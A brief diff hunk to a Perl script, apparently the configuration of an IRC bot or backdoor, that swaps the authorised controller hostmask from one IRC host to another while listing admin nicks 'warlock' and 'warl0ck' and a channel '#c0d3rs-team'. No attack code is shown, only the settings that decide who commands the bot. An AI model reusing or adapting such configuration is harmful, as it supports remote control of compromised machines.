@@ -10,7 +10,7 @@ my $cmd="";
 my $id="";
 ############################################
 my @adms=("warlock" , "warl0ck");
-my @hostauth=("warl0ck.shell.oddprotocol.org");
+my @hostauth=("Terr0r.users.undernet.org");
 my @canais=("#c0d3rs-team");
 my $chanpass = "@";
 $num = int rand(99999);
